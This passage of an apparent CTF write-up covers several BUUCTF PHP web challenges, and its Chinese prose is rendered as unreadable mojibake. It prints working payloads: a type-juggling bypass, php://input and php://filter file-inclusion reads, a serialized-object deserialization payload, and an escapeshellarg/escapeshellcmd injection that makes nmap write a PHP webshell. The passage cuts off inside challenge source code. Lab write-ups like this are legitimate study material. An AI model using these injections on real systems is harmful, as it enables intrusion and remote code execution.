å‘ç°ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">post money <span class=\"keyword\">and</span> password~~~</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'password'</span>])) &#123;</span><br><span class=\"line\">\t$password = $_POST[<span class=\"string\">'password'</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (is_numeric($password)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"password can't be number&lt;/br&gt;\"</span>;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">elseif</span> ($password == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"Password Right!&lt;/br&gt;\"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>æŠ“åŒ…ä¼ æ•°æ®ï¼š</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/pay.php</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: b1fc07df-c7ae-46e3-8a06-565ab682d9ca.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">DNT</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: user=1</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 28</span><br><span class=\"line\"></span><br><span class=\"line\">money[]00000000&amp;password=404%23</span><br></pre></td></tr></table></figure>\n\n<p>å‘ç°èº«ä»½éªŒè¯ä¸é€šè¿‡ï¼Œçœ‹åˆ° Cookie ï¼Œæ”¹æˆ 1 ï¼›ç»•è¿‡ <code>is_numeric</code> åŠ  </p>\n<p><code>%23</code> ; ä¼ å®Œåˆæç¤º money é•¿åº¦è¿‡é•¿ï¼Œæ•°ç»„ç»•è¿‡ã€‚</p>\n<h3 id=\"nizhuansiwei\"><a href=\"#nizhuansiwei\" class=\"headerlink\" title=\"nizhuansiwei\"></a>nizhuansiwei</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">$text = $_GET[<span class=\"string\">\"text\"</span>];</span><br><span class=\"line\">$file = $_GET[<span class=\"string\">\"file\"</span>];</span><br><span class=\"line\">$password = $_GET[<span class=\"string\">\"password\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class=\"string\">'r'</span>)===<span class=\"string\">\"welcome to the zjctf\"</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;&lt;h1&gt;\"</span>.file_get_contents($text,<span class=\"string\">'r'</span>).<span class=\"string\">\"&lt;/h1&gt;&lt;/br&gt;\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/flag/\"</span>,$file))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Not now!\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(); </span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>($file);  <span class=\"comment\">//useless.php</span></span><br><span class=\"line\">        $password = unserialize($password);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code> ä¼ªåè®®postæ•°æ®ï¼š <code>php://input</code> ;</p>\n<p><code>include($file);</code> è¿™é‡ŒåŒ…å«äº†ä¸€ä¸ªæ–‡ä»¶å¹¶ä¸”æç¤ºæ–‡ä»¶åå­—ï¼Œæˆ‘ä»¬å†ç”¨å¦ä¸€ä¸ªä¼ªåè®®è¯»ä¸€ä¸‹æ–‡ä»¶å†…å®¹ï¼š</p>\n<p><code>php://filter/convert.base64-encode/resource=useless.php</code></p>\n<p>*æ³¨ï¼šåªæœ‰ä¸€ä¸ª <code>include()</code> å³å¯ä½¿ç”¨ä¼ªåè®®å°†æ–‡ä»¶å†…å®¹åŒ…å«å‡ºæ¥</p>\n<p>å°†å¾—åˆ°å†…å®¹è§£å¯†ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flag</span></span>&#123;  <span class=\"comment\">//flag.php  </span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span></span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;file))&#123;  </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> file_get_contents(<span class=\"keyword\">$this</span>-&gt;file); </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"string\">\"U R SO CLOSE !///COME ON PLZ\"</span>);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>è¿›è¡Œåºåˆ—åŒ–ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = <span class=\"keyword\">new</span> Flag();</span><br><span class=\"line\">$a-&gt;file = <span class=\"string\">\"flag.php\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>\n\n<p>ç°åœ¨çš„ url ï¼š<code>buuoj.cn/?text=php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>\n<h3 id=\"include\"><a href=\"#include\" class=\"headerlink\" title=\"include\"></a>include</h3><p>ä¼ªåè®® <code>?file=php://filter/convert.base64-encode/resource=index.php</code> è¯»ä¸€ä¸‹æºç </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class=\"line\">\texit(&apos;hacker!&apos;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if($file)&#123;</span><br><span class=\"line\">\tinclude($file);</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\techo &apos;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&apos;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>å“¦ï¼Œç„¶åç›´æ¥è¯» <code>flag.php</code></p>\n<h3 id=\"Online-Tool\"><a href=\"#Online-Tool\" class=\"headerlink\" title=\"Online Tool\"></a>Online Tool</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_SERVER[<span class=\"string\">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class=\"line\">    $_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>] = $_SERVER[<span class=\"string\">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'host'</span>])) &#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    $host = $_GET[<span class=\"string\">'host'</span>];</span><br><span class=\"line\">    $host = escapeshellarg($host);</span><br><span class=\"line\">    $host = escapeshellcmd($host);</span><br><span class=\"line\">    $sandbox = md5(<span class=\"string\">\"glzjin\"</span>. $_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'you are in sandbox '</span>.$sandbox;</span><br><span class=\"line\">    @mkdir($sandbox);</span><br><span class=\"line\">    chdir($sandbox);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> system(<span class=\"string\">\"nmap -T5 -sT -Pn --host-timeout 2 -F \"</span>.$host);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>ç™¾åº¦åˆ°æ–‡ç« </p>\n<p>æˆ‘ä»¬ç¼–å†™ç¤ºä¾‹ä»£ç ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$param = <span class=\"string\">\"127.0.0.1' -v -d a=1\"</span>;</span><br><span class=\"line\">$ep = escapeshellarg($param);</span><br><span class=\"line\">$eep = escapeshellcmd($ep);</span><br><span class=\"line\">$cmd = <span class=\"string\">\"curl \"</span>.$eep;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $ep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $eep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $cmd.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">system($cmd);</span><br><span class=\"line\"></span><br><span class=\"line\">è¾“å‡ºç»“æœï¼š</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'127.0.0.1'</span>\\<span class=\"string\">''</span> -v -d a=<span class=\"number\">1</span><span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">'</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"string\">'\\\\'</span><span class=\"string\">' -v -d a=1\\'</span></span><br><span class=\"line\"><span class=\"string\">curl '</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"string\">'\\\\'</span><span class=\"string\">' -v -d a=1\\'</span></span><br><span class=\"line\"><span class=\"string\">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class=\"line\"><span class=\"string\">                                 Dload  Upload   Total   Spent    Left  Speed</span></span><br><span class=\"line\"><span class=\"string\">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: 127.0.0.1\\</span></span><br><span class=\"line\"><span class=\"string\">* Closing connection 0</span></span><br></pre></td></tr></table></figure>\n\n<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¾“å…¥ <code>127.0.0.1&#39; -v -d a=1</code> åï¼Œç»è¿‡ <code>escapeshellarg()</code> è½¬ä¹‰å˜æˆ<code>&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1&#39;</code> ã€‚</p>\n<p> <code>&#39;</code> è¢«è½¬ä¹‰ä¸º <code>\\&#39;</code> ,è¢«éš”å¼€çš„ä¸¤éƒ¨åˆ†åˆ†åˆ«å·¦å³ä¸¤ç«¯åŠ ä¸Šä¸€å¯¹ <code>&#39;&#39;</code> ç„¶åè¿æ¥åœ¨ä¸€èµ·ï¼›</p>\n<p> ç„¶åç»è¿‡ <code>escapeshelcmd()</code> åï¼Œå˜æˆäº† <code>&#39;127.0.0.1&#39;\\\\&#39;&#39; -v -d a=1\\&#39;</code>, å¯ä»¥çœ‹åˆ°ä¸Šä¸€æ­¥ç•™ä¸‹çš„ <code>\\</code> å†æ¬¡è¢«è½¬ä¹‰æˆ <code>\\\\</code> ï¼Œè¿™æ—¶å°±åªè¡¨ç¤º <code>\\</code> ï¼Œä¸èµ·è½¬ä¹‰ä½œç”¨ï¼Œäºæ˜¯ <code>127.0.0.1</code> å•ç‹¬æˆç»„ï¼Œç´§è·Ÿ <code>\\</code> ï¼Œåé¢ä¸¤ä¸ªå•å¼•å·å•ç‹¬æˆç»„ <code>&#39;&#39;</code> ï¼Œåªå‰©ä¸‹ç»“å°¾çš„ä¸€ä¸ª <code>&#39;</code> è¢«è½¬ä¹‰ <code>\\&#39;</code> </p>\n<p>æœ€åæ‰§è¡Œçš„å‘½ä»¤å°±å˜æˆäº† <code>curl &#39;127.0.0.1&#39;\\ -v -d a=1&#39;</code> , è¯·æ±‚çš„æ˜¯ <code>127.0.0.1\\</code> , POSTçš„æ•°æ®æ˜¯ <code>a=1&#39;</code> .</p>\n<p>å›åˆ°é¢˜ç›®å¯ä»¥çœ‹åˆ°ä½¿ç”¨çš„æ˜¯ <code>&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host</code>  ,è€Œé€šè¿‡æŸ¥çœ‹ nmap æ‰‹å†Œå‘ç°è¾“å‡ºå‘½ä»¤ï¼Œæˆ‘ä»¬è¯•ä¸€ä¸‹</p>\n<p><code>nmap 127.0.0.1 -oN 1.php</code> </p>\n<p>æŸ¥çœ‹ 1.php å†…å®¹</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Nmap 7.70 scan initiated Thu Apr 23 19:48:07 2020 as: nmap -oN 1.php 127.0.0.1</span></span><br><span class=\"line\">Nmap scan report for localhost (127.0.0.1)</span><br><span class=\"line\">Host is up (0.0000060s latency).</span><br><span class=\"line\">Not shown: 998 closed ports</span><br><span class=\"line\">PORT    STATE SERVICE</span><br><span class=\"line\">80/tcp  open  http</span><br><span class=\"line\">111/tcp open  rpcbind</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Nmap <span class=\"keyword\">done</span> at Thu Apr 23 19:48:08 2020 -- 1 IP address (1 host up) scanned <span class=\"keyword\">in</span> 0.51 seconds</span></span><br></pre></td></tr></table></figure>\n\n<p>æœ‰äº†ä¸Šé¢çš„çŸ¥è¯†åï¼Œå‰©ä¸‹çš„å°±æ˜¯æƒ³åŠæ³•ç»•è¿‡é¢˜ç›®çš„é™åˆ¶</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">example.php</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$param1 = <span class=\"string\">\" ' &lt;?php echo `ls`;?&gt; -oN 1.php ' \"</span>;</span><br><span class=\"line\">$ep = escapeshellarg($param1);</span><br><span class=\"line\">$eep = escapeshellcmd($ep);</span><br><span class=\"line\">$cmd = <span class=\"string\">\"nmap \"</span>.$eep;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $ep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $eep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $cmd.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">system($cmd);</span><br><span class=\"line\"></span><br><span class=\"line\">è¾“å‡ºï¼š</span><br><span class=\"line\"> <span class=\"string\">' &lt;?php echo `ls`;?&gt; -oN 1.php '</span> </span><br><span class=\"line\"><span class=\"string\">' '</span>\\<span class=\"string\">''</span> <span class=\"meta\">&lt;?php</span> <span class=\"keyword\">echo</span> `ls`;<span class=\"meta\">?&gt;</span> -oN <span class=\"number\">1.</span>php <span class=\"string\">'\\''</span> <span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">'</span> <span class=\"string\">'\\\\'</span><span class=\"string\">' \\&lt;\\?php echo \\`ls\\`\\;\\?\\&gt; -oN 1.php '</span>\\\\<span class=\"string\">''</span> <span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">nmap '</span> <span class=\"string\">'\\\\'</span><span class=\"string\">' \\&lt;\\?php echo \\`ls\\`\\;\\?\\&gt; -oN 1.php '</span>\\\\<span class=\"string\">''</span> <span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-23 20:06 CST</span></span><br></pre></td></tr></table></figure>\n\n<p>æŸ¥çœ‹ 1.php å¯ä»¥çœ‹åˆ°æ‰§è¡Œçš„å‘½ä»¤æ˜¯</p>\n<p><code>nmap -oN 1.php \\ &lt;?php echo</code>ls<code>;?&gt; \\\\</code></p>\n<p> æˆ‘ä»¬ä¼ å…¥å‚æ•° <code>&#39; &lt;?php echo &#39;ls&#39;;?&gt; -oN 1.php &#39;</code>  , åŠ çš„å•å¼•å·ç›®çš„æ˜¯ä¸ºäº†é€šè¿‡å•å¼•å·é—­åˆè½¬ä¹‰åŠ ä¸Šçš„å•å¼•å·ã€‚</p>\n<p>éœ€è¦æ³¨æ„çš„æ˜¯å‚æ•°åé¢çš„å•å¼•å·éœ€è¦éš”ä¸€ä¸ªç©ºæ ¼ï¼Œä¸ç„¶ç”Ÿæˆçš„æ–‡ä»¶åå°±ä¼šæ˜¯ <code>.php\\\\</code> ,ä¸èƒ½è¢«æ­£å¸¸è§£æäº†ã€‚ éšæœºæˆ‘ä»¬è¿è¡Œ 1.php ,å¯ä»¥çœ‹åˆ°æˆåŠŸè§£æäº†ã€‚</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:~/æ¡Œé¢# php 1.php</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Nmap 7.70 scan initiated Sat Apr 25 11:16:03 2020 as: nmap -oN 1.php \\ 1.php</span></span><br><span class=\"line\">1.php\\\\ </span><br><span class=\"line\">1.txt</span><br><span class=\"line\">ctf</span><br><span class=\"line\">dc-2.txt</span><br><span class=\"line\">escapeshellarg.php</span><br><span class=\"line\">index.php~</span><br><span class=\"line\">pickle1.py</span><br><span class=\"line\">shell-7.x-1.0-beta5.zip</span><br><span class=\"line\">shell.py</span><br><span class=\"line\">snippet.py</span><br><span class=\"line\">test.php</span><br><span class=\"line\">th.jpeg</span><br><span class=\"line\">top6000.txt</span><br><span class=\"line\"> \\\\</span><br><span class=\"line\">Failed to resolve \"\\\".</span><br><span class=\"line\">Failed to resolve \"&lt;?php\".</span><br></pre></td></tr></table></figure>\n\n<p>å¯¹äºæœ¬é¢˜ï¼Œå¯ä»¥ä¼ å…¥</p>\n<p><code>&#39; &lt;?php echo &#39;ls&#39;;?&gt; -oN 1.php  &#39;</code></p>\n<h3 id=\"piapiapia\"><a href=\"#piapiapia\" class=\"headerlink\" title=\"piapiapia\"></a>piapiapia</h3><p>æ‰«æç›®å½•å¾—åˆ°æºç </p>\n<p>class.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require</span>(<span class=\"string\">'config.php'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">user</span> <span class=\"keyword\">extends</span> <span class=\"title\">mysql</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> $table = <span class=\"string\">'users'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">is_exists</span><span class=\"params\">($username)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::select(<span class=\"keyword\">$this</span>-&gt;table, $where);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">register</span><span class=\"params\">($username, $password)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">\t\t$password = <span class=\"keyword\">parent</span>::filter($password);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$key_list = <span class=\"keyword\">Array</span>(<span class=\"string\">'username'</span>, <span class=\"string\">'password'</span>);</span><br><span class=\"line\">\t\t$value_list = <span class=\"keyword\">Array</span>($username, md5($password));</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::insert(<span class=\"keyword\">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span 